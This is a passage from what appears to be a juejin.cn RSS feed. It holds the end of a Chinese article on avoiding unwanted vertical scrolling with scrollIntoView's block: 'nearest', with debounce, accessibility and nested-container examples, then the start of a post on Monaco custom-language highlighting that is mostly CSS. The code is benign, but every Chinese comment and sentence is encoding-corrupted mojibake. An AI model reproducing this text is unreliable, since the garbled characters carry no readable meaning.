      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>
    });
    
    <span class="hljs-comment">// 3ç§’ååœæ­¢è§‚å¯Ÿ</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">unobserve</span>(element);
    }, <span class="hljs-number">3000</span>);
  }
  
  <span class="hljs-title function_">onIntersection</span>(<span class="hljs-params">entries</span>) {
    entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å…ƒç´ å·²è¿›å…¥è§†å£'</span>);
        <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œè§¦å‘å…¶ä»–åŠ¨ç”»æˆ–æ•ˆæœ</span>
      }
    });
  }
}
</code></pre>
<h3 data-id="heading-19">2. <strong>æ€§èƒ½ä¼˜åŒ–ï¼šé˜²æŠ–å¤„ç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createDebouncedScroll</span>(<span class="hljs-params">delay = <span class="hljs-number">150</span></span>) {
  <span class="hljs-keyword">let</span> timeoutId = <span class="hljs-literal">null</span>;
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">element, options = {}</span>) {
    <span class="hljs-keyword">if</span> (timeoutId) {
      <span class="hljs-built_in">clearTimeout</span>(timeoutId);
    }
    
    timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      element.<span class="hljs-title function_">scrollIntoView</span>({
        <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
        <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
        <span class="hljs-attr">inline</span>: options.<span class="hljs-property">inline</span> || <span class="hljs-string">'center'</span>,
        ...options
      });
      timeoutId = <span class="hljs-literal">null</span>;
    }, delay);
  };
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> debouncedScroll = <span class="hljs-title function_">createDebouncedScroll</span>();
<span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'scroll-button'</span>);
button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">debouncedScroll</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'target-element'</span>));
});
</code></pre>
<h3 data-id="heading-20">3. <strong>å¯è®¿é—®æ€§è€ƒè™‘</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">accessibleScrollTo</span>(<span class="hljs-params">element, options = {}</span>) {
  <span class="hljs-keyword">const</span> defaultOptions = {
    <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
    <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
    <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>,
    <span class="hljs-attr">focus</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ˜¯å¦èšç„¦åˆ°å…ƒç´ </span>
    <span class="hljs-attr">announce</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// æ˜¯å¦å±å¹•é˜…è¯»å™¨æ’­æŠ¥</span>
  };
  
  <span class="hljs-keyword">const</span> config = { ...defaultOptions, ...options };
  
  <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨</span>
  element.<span class="hljs-title function_">scrollIntoView</span>({
    <span class="hljs-attr">behavior</span>: config.<span class="hljs-property">behavior</span>,
    <span class="hljs-attr">block</span>: config.<span class="hljs-property">block</span>,
    <span class="hljs-attr">inline</span>: config.<span class="hljs-property">inline</span>
  });
  
  <span class="hljs-comment">// å¯è®¿é—®æ€§å¢å¼º</span>
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">focus</span>) {
    element.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'tabindex'</span>, <span class="hljs-string">'-1'</span>);
    element.<span class="hljs-title function_">focus</span>();
    
    <span class="hljs-comment">// ç§»é™¤ tabindex é¿å…å½±å“æ­£å¸¸ tab é¡ºåº</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      element.<span class="hljs-title function_">removeAttribute</span>(<span class="hljs-string">'tabindex'</span>);
    }, <span class="hljs-number">100</span>);
  }
  
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">announce</span> &amp;&amp; <span class="hljs-string">'liveRegion'</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">this</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">announceToScreenReader</span>(<span class="hljs-string">`å·²æ»šåŠ¨åˆ° <span class="hljs-subst">${element.textContent}</span>`</span>);
  }
}
</code></pre>
<h2 data-id="heading-21">å¸¸è§é—®é¢˜è§£ç­”</h2>
<h3 data-id="heading-22">Q1ï¼šä¸ºä»€ä¹ˆæœ‰æ—¶å€™è¿˜æ˜¯ä¼šæœ‰è½»å¾®è·³åŠ¨ï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼šæ·»åŠ  CSS çº¦æŸ</span>
.<span class="hljs-property">scroll</span>-container {
  overflow-<span class="hljs-attr">x</span>: auto;
  overflow-<span class="hljs-attr">y</span>: hidden; <span class="hljs-comment">/* æ˜ç¡®ç¦æ­¢å‚ç›´æ»šåŠ¨ */</span>
  scrollbar-<span class="hljs-attr">width</span>: thin; <span class="hljs-comment">/* ç°ä»£æµè§ˆå™¨ */</span>
  -webkit-overflow-<span class="hljs-attr">scrolling</span>: touch; <span class="hljs-comment">/* iOS å¹³æ»‘æ»šåŠ¨ */</span>
}
</code></pre>
<h3 data-id="heading-23">Q2ï¼šå¦‚ä½•ç¡®ä¿åœ¨ç§»åŠ¨ç«¯ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">mobileSafeScroll</span>(<span class="hljs-params">element</span>) {
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨ç§»åŠ¨ç«¯</span>
  <span class="hljs-keyword">const</span> isMobile = <span class="hljs-regexp">/iPhone|iPad|iPod|Android/i</span>.<span class="hljs-title function_">test</span>(navigator.<span class="hljs-property">userAgent</span>);
  
  element.<span class="hljs-title function_">scrollIntoView</span>({
    <span class="hljs-attr">behavior</span>: isMobile ? <span class="hljs-string">'auto'</span> : <span class="hljs-string">'smooth'</span>, <span class="hljs-comment">// ç§»åŠ¨ç«¯å¯èƒ½ä¸æ”¯æŒsmooth</span>
    <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
    <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>
  });
  
  <span class="hljs-comment">// ç§»åŠ¨ç«¯é¢å¤–å¤„ç†</span>
  <span class="hljs-keyword">if</span> (isMobile) {
    <span class="hljs-comment">// é˜²æ­¢æ»šåŠ¨ç©¿é€</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">'hidden'</span>;
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">overflow</span> = <span class="hljs-string">''</span>;
    }, <span class="hljs-number">300</span>);
  }
}
</code></pre>
<h3 data-id="heading-24">Q3ï¼šå¦‚ä½•å¤„ç†åµŒå¥—æ»šåŠ¨å®¹å™¨ï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">scrollInNestedContainer</span>(<span class="hljs-params">element, containerSelector</span>) {
  <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(containerSelector);
  <span class="hljs-keyword">if</span> (!container) <span class="hljs-keyword">return</span>;
  
  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦åœ¨å®¹å™¨å†…</span>
  <span class="hljs-keyword">if</span> (container.<span class="hljs-title function_">contains</span>(element)) {
    <span class="hljs-comment">// è®¡ç®—ç›¸å¯¹ä½ç½®</span>
    <span class="hljs-keyword">const</span> containerRect = container.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementRect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    
    <span class="hljs-keyword">const</span> scrollLeft = elementRect.<span class="hljs-property">left</span> - containerRect.<span class="hljs-property">left</span> + container.<span class="hljs-property">scrollLeft</span>;
    
    container.<span class="hljs-title function_">scrollTo</span>({
      <span class="hljs-attr">left</span>: scrollLeft - (container.<span class="hljs-property">clientWidth</span> - elementRect.<span class="hljs-property">width</span>) / <span class="hljs-number">2</span>,
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// ä½¿ç”¨é»˜è®¤æ–¹æ³•</span>
    element.<span class="hljs-title function_">scrollIntoView</span>({
      <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
      <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,
      <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>
    });
  }
}
</code></pre>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>é€šè¿‡ä»Šå¤©çš„å®è·µï¼Œæˆ‘ä»¬å­¦åˆ°äº†ä¸€ä¸ªç®€å•è€Œå¼ºå¤§çš„æŠ€å·§ï¼š<strong>ä½¿ç”¨ <code>block: 'nearest'</code> å¯ä»¥é¿å… <code>scrollIntoView</code> çš„æ„å¤–æ»šåŠ¨è¡Œä¸º</strong>ã€‚</p>
<h3 data-id="heading-26">æ ¸å¿ƒè¦ç‚¹</h3>
<ol>
<li><strong>é—®é¢˜æ ¹æº</strong>ï¼š<code>scrollIntoView</code> é»˜è®¤çš„ <code>block: 'start'</code> å¯èƒ½å¯¼è‡´ä¸å¿…è¦çš„å‚ç›´æ»šåŠ¨</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šæ”¹ç”¨ <code>block: 'nearest'</code> ä¿æŒå‚ç›´ä½ç½®ä¸å˜</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šæ¨ªå‘æ»šåŠ¨å®¹å™¨ã€Tabç»„ä»¶ã€è½®æ’­å›¾ç­‰</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒï¼Œå¹³æ»‘æ»šåŠ¨éœ€è¦é™çº§å¤„ç†</li>
</ol>
<h3 data-id="heading-27">æ¨èå†™æ³•</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯¹äºæ¨ªå‘æ»šåŠ¨ï¼Œæ¨èä½¿ç”¨ï¼š</span>
element.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
  <span class="hljs-attr">block</span>: <span class="hljs-string">'nearest'</span>,    <span class="hljs-comment">// é¿å…å‚ç›´æ»šåŠ¨</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'center'</span>     <span class="hljs-comment">// æ°´å¹³å±…ä¸­</span>
});

<span class="hljs-comment">// å¯¹äºçºµå‘æ»šåŠ¨ï¼Œæ¨èä½¿ç”¨ï¼š</span>
element.<span class="hljs-title function_">scrollIntoView</span>({
  <span class="hljs-attr">behavior</span>: <span class="hljs-string">'smooth'</span>,
  <span class="hljs-attr">block</span>: <span class="hljs-string">'center'</span>,     <span class="hljs-comment">// å‚ç›´å±…ä¸­</span>
  <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>    <span class="hljs-comment">// é¿å…æ°´å¹³æ»šåŠ¨</span>
});
</code></pre>
<p>æœ‰æ—¶å€™ï¼Œæœ€ç®€å•çš„ä¸€è¡Œä»£ç è°ƒæ•´ï¼Œå°±èƒ½è§£å†³å›°æ‰°å·²ä¹…çš„é—®é¢˜ã€‚å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ æ›´å¥½åœ°æŒæ¡ <code>scrollIntoView</code> çš„ä½¿ç”¨æŠ€å·§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•åœ¨ monaco ä¸­å®ç°è‡ªå®šä¹‰è¯­è¨€çš„é«˜äº®]]></title>    <link>https://juejin.cn/post/7592452108797296683</link>    <guid>https://juejin.cn/post/7592452108797296683</guid>    <pubDate>2026-01-07T13:39:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592452108797296683" data-draft-id="7591407298415034374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•åœ¨ monaco ä¸­å®ç°è‡ªå®šä¹‰è¯­è¨€çš„é«˜äº®"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2026-01-07T13:39:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å²³å‡ºäºå±±"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476454536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•åœ¨ monaco ä¸­å®ç°è‡ªå®šä¹‰è¯­è¨€çš„é«˜äº®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476454536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å²³å‡ºäºå±±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T13:39:33.000Z" title="Wed Jan 07 2026 13:39:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>å¦‚ä¸‹ä»£ç ï¼Œåœ¨ monaco ä¸Šæ³¨å†Œ <code>mylang</code> 